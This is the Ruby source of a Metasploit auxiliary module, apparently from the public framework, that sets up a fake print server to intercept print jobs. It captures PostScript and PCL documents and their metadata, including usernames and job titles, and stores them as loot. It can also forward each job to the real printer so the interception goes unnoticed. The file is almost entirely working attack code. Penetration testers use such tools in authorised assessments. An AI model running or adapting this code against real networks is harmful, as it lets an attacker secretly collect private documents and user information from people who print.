##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Printjob Capture Service',
      'Description' => %q{
        This module is designed to listen for PJL or PostScript print
        jobs. Once a print job is detected it is saved to loot. The
        captured printjob can then be forwarded on to another printer
        (required for LPR printjobs). Resulting PCL/PS files can be
        read with GhostScript/GhostPCL.

        Note, this module does not yet support IPP connections.
      },
      'Author' => ['Chris John Riley', 'todb'],
      'License' => MSF_LICENSE,
      'References' => [
        # Based on previous prn-2-me tool (Python)
        ['URL', 'http://blog.c22.cc/toolsscripts/prn-2-me/'],
        # Readers for resulting PCL/PC
        ['URL', 'http://www.ghostscript.com']
      ],
      'Actions' => [[ 'Capture', { 'Description' => 'Run print job capture server' } ]],
      'PassiveActions' => ['Capture'],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options([
      OptPort.new('SRVPORT', [ true, 'The local port to listen on', 9100 ]),
      OptBool.new('FORWARD', [ true, 'Forward print jobs to another host', false ]),
      OptAddress.new('RHOST', [ false, 'Forward to remote host' ]),
      OptPort.new('RPORT', [ false, 'Forward to remote port', 9100 ]),
      OptBool.new('METADATA', [ true, 'Display Metadata from printjobs', true ]),
      OptEnum.new('MODE', [ true, 'Print mode', 'RAW', ['RAW', 'LPR']]) # TODO: Add IPP
    ])

    deregister_options('SSL', 'SSLVersion', 'SSLCert', 'RHOSTS')
  end

  def setup
    super
    @state = {}

    begin
      @srvhost = datastore['SRVHOST']
      @srvport = datastore['SRVPORT'] || 9100
      @mode = datastore['MODE'].upcase || 'RAW'
      if datastore['FORWARD']
        @forward = datastore['FORWARD']
        @rport = datastore['RPORT'] || 9100
        if datastore['RHOST'].nil?
          fail_with(Failure::BadConfig, 'Cannot forward without a valid RHOST')
        end
        @rhost = datastore['RHOST']
        print_status("Forwarding all printjobs to #{@rhost}:#{@rport}")
      end
      if (@mode != 'RAW') && !@forward
        fail_with(Failure::BadConfig, 'Cannot intercept LPR/IPP without a forwarding target')
      end
      @metadata = datastore['METADATA']
      print_status("Starting Print Server on #{@srvhost}:#{@srvport} - #{@mode} mode")

      exploit
    rescue StandardError => e
      print_error(e.message)
    end
  end

  def on_client_connect(client)
    @state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport,
      user: nil,
      pass: nil,
      data: '',
      raw_data: '',
      prn_title: '',
      prn_type: '',
      prn_metadata: {},
      meta_output: []
    }

    print_status("#{name}: Client connection from #{client.peerhost}:#{client.peerport}")
  end

  def on_client_data(client)
    curr_data = client.get_once
    @state[client][:data] << curr_data
    if @mode == 'RAW'
      # RAW Mode - no further actions
    elsif (@mode == 'LPR') || (@mode == 'IPP')
      response = stream_data(curr_data)
      client.put(response)
    end

    if Rex::Text.to_hex(curr_data.first) == '\x02' && Rex::Text.to_hex(curr_data.last) == '\x0a' && !curr_data[1..-2].empty?
      print_status("LPR Jobcmd \"#{curr_data[1..-2]}\" received")
    end

    return if !@state[client][:data]
  end

  def on_client_close(client)
    print_status("#{name}: Client #{client.peerhost}:#{client.peerport} closed connection after #{@state[client][:data].length} bytes of data")
    sock.close if sock

    # forward RAW data as it's not streamed
    if @forward && (@mode == 'RAW')
      forward_data(@state[client][:data])
    end

    # extract print data and Metadata from @state[client][:data]
    begin
      # postscript data
      if @state[client][:data] =~ /%!PS-Adobe/i
        @state[client][:prn_type] = 'PS'
        print_good('Printjob intercepted - type PostScript')
        # extract PostScript data including header and EOF marker
        @state[client][:raw_data] = @state[client][:data].match(/%!PS-Adobe.*%%EOF/im)[0]
        # pcl data (capture PCL or PJL start code)
      elsif @state[client][:data].unpack('H*')[0] =~ /(1b45|1b25|1b26)/
        @state[client][:prn_type] = 'PCL'
        print_good('Printjob intercepted - type PCL')
        # extract everything between PCL start and end markers (various)
        @state[client][:raw_data] = Array(@state[client][:data].unpack('H*')[0].match(/((1b45|1b25|1b26).*(1b45|1b252d313233343558))/i)[0]).pack('H*')
      end
      # extract Postsript Metadata
      metadata_ps(client) if @state[client][:data] =~ /^%%/i

      # extract PJL Metadata
      metadata_pjl(client) if @state[client][:data] =~ /@PJL/i

      # extract IPP Metadata
      metadata_ipp(client) if @state[client][:data] =~ %r{POST /ipp}i || @state[client][:data] =~ %r{application/ipp}i

      if @state[client][:prn_type].empty?
        print_error('Unable to detect printjob type, dumping complete output')
        @state[client][:prn_type] = 'Unknown Type'
        @state[client][:raw_data] = @state[client][:data]
      end

      # output discovered Metadata if set
      if @state[client][:meta_output] && @metadata
        @state[client][:meta_output].sort.each do |out|
          # print metadata if not empty
          print_status(out.to_s) if !out.empty?
        end
      else
        print_status('No metadata gathered from printjob')
      end

      # set name to unknown if not discovered via Metadata
      @state[client][:prn_title] = 'Unnamed' if @state[client][:prn_title].empty?

      # store loot
      storefile(client) if !@state[client][:raw_data].empty?

      # clear state
      @state.delete(client)
    rescue StandardError => e
      print_error(e.message)
    end
  end

  def metadata_pjl(client)
    # extract PJL Metadata

    @state[client][:prn_metadata] = @state[client][:data].scan(/^@PJL\s(JOB=|SET\s|COMMENT\s)(.*)$/i)
    print_good('Extracting PJL Metadata')
    @state[client][:prn_metadata].each do |meta|
      if meta[0] =~ /^COMMENT/i
        @state[client][:meta_output] << meta[0].to_s + meta[1].to_s
      end
      if meta[1] =~ /^NAME|^STRINGCODESET|^RESOLUTION|^USERNAME|^JOBNAME|^JOBATTR/i
        @state[client][:meta_output] << meta[1].to_s
      end
      if meta[1] =~ /^NAME/i
        @state[client][:prn_title] = meta[1].strip
      elsif meta[1] =~ /^JOBNAME/i
        @state[client][:prn_title] = meta[1].strip
      end
    end
  end

  def metadata_ps(client)
    # extract Postsript Metadata

    @state[client][:prn_metadata] = @state[client][:data].scan(/^%%(.*)$/i)
    print_good('Extracting PostScript Metadata')
    @state[client][:prn_metadata].each do |meta|
      if meta[0] =~ /^Title|^Creat(or|ionDate)|^For|^Target|^Language/i
        @state[client][:meta_output] << meta[0].to_s
      end
      if meta[0] =~ /^Title/i
        @state[client][:prn_title] = meta[0].strip
      end
    end
  end

  def metadata_ipp(client)
    # extract IPP Metadata

    @state[client][:prn_metadata] = @state[client][:data]
    print_good('Extracting IPP Metadata')
    case @state[client][:prn_metadata]
    when /User-Agent:/i
      @state[client][:meta_output] << @state[client][:prn_metadata].scan(/^User-Agent:.*/i)
    when /Server:/i
      @state[client][:meta_output] << @state[client][:prn_metadata].scan(/^Server:.*/i)
    when %r{printer-uri..ipp://.*/ipp/}i
      @state[client][:meta_output] << @state[client][:prn_metadata].scan(%r{printer-uri..ipp://.*/ipp/}i)
    when /requesting-user-name..\w+/i
      @state[client][:meta_output] << @state[client][:prn_metadata].scan(/requesting-user-name..\w+/i)
    end
  end

  def forward_data(data_to_send)
    print_status("Forwarding PrintJob on to #{@rhost}:#{@rport}")
    connect
    sock.put(data_to_send)
    sock.close
  end

  def stream_data(data_to_send)
    vprint_status("Streaming #{data_to_send.length} bytes of data to #{@rhost}:#{@rport}")
    connect if !sock
    sock.put(data_to_send)
    response = sock.get_once
    return response
  end

  def storefile(client)
    return unless @state[client][:raw_data]

    # store the file

    jobname = File.basename(@state[client][:prn_title].gsub('\\', '/'), '.*')
    filename = "#{jobname}.#{@state[client][:prn_type]}"
    loot = store_loot(
      "prn_snarf.#{@state[client][:prn_type].downcase}",
      "#{@state[client][:prn_type]} printjob",
      client.peerhost,
      @state[client][:raw_data],
      filename,
      'PrintJob capture'
    )
    print_good("Incoming printjob - #{@state[client][:prn_title]} saved to loot")
    print_good("Loot filename: #{loot}")
  end
end
